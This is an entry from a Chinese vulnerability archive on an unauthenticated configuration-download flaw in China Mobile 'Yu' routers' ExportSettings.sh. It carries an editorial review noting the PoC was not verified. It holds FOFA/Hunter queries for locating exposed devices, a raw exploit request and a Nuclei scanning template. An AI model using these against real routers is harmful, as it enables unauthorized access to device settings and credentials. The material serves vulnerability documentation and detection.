---
source: "wy876 漏洞文库"
id: "vw-679bb4e16eb42100e4122856"
entity_id: "ve-679bb4e16eb42100e4122856"
schema_version: "1"
fofa_unverified: "title="
title: "中国移动禹路由ExportSettings.sh存在信息泄露漏洞"
product: "中移铁通禹路由"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无cookie请求，未给型号/固件"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8%E7%BD%91%E5%85%B3/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8%E7%A6%B9%E8%B7%AF%E7%94%B1ExportSettings.sh%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/qmarera6wxzybbby"
source_status: "recorded"
---

# 中国移动禹路由ExportSettings.sh存在信息泄露漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：中移铁通禹路由
- 本文讨论：ExportSettings.sh未授权配置下载
- 版本、权限与配置前提：无cookie请求，未给型号/固件
- 资料类型：配置泄露请求和Nuclei模板；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 匹配wan_ipaddr和HostName只能证明配置字段，不能证明泄露登录密码
- fofa元数据残缺；template无用随机变量残留；无补丁
- Wi-Fi6等泛产品介绍不代表全部禹路由型号
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 响应敏感字段、认证与版本范围待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 一、漏洞简介
 中移禹路由器是一款性能强大且功能丰富的无线路由器。它采用了最新的Wi-Fi 6技术，提供更快的速度和更稳定的连接。它支持双频段同时工作，2.4GHz和5GHz频段可同时提供高速的无线网络，满足多设备同时连接的需求。中移禹路由器还具备MU-MIMO技术，可以同时处理多个设备的数据传输，提供更快的速度和更稳定的连接。中移铁通禹路由器ExportSettings接口处存在信息泄露漏洞，恶意攻击者可能会利用此漏洞获取到登陆账户和密码，从而登录后台，使服务器处于不安全的状态。  

## 二、资产测绘
```plain
fofa：title="互联世界 物联未来-登录"
hunter：web.body="互联世界 物联未来-登录"
```


## 三、漏洞复现
```http
GET /cgi-bin/ExportSettings.sh HTTP/1.1
Host:127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0

```


## 四、Nuclei
```http
id: ZYTT-ExportSettings-Info

info:
  name: 中移铁通禹路由器-信息泄露-ExportSettings
  author: haoguoguo
  severity: high
  metadata: 
    fofa-query: title="互联世界 物联未来-登录"
variables:
  filename: "{{to_lower(rand_base(5))}}"
  boundary: "{{to_lower(rand_base(20))}}"
http:
  - raw:
      - |
        GET /cgi-bin/ExportSettings.sh HTTP/1.1
        Host:{{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 0


    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"wan_ipaddr","HostName")
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qmarera6wxzybbby>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
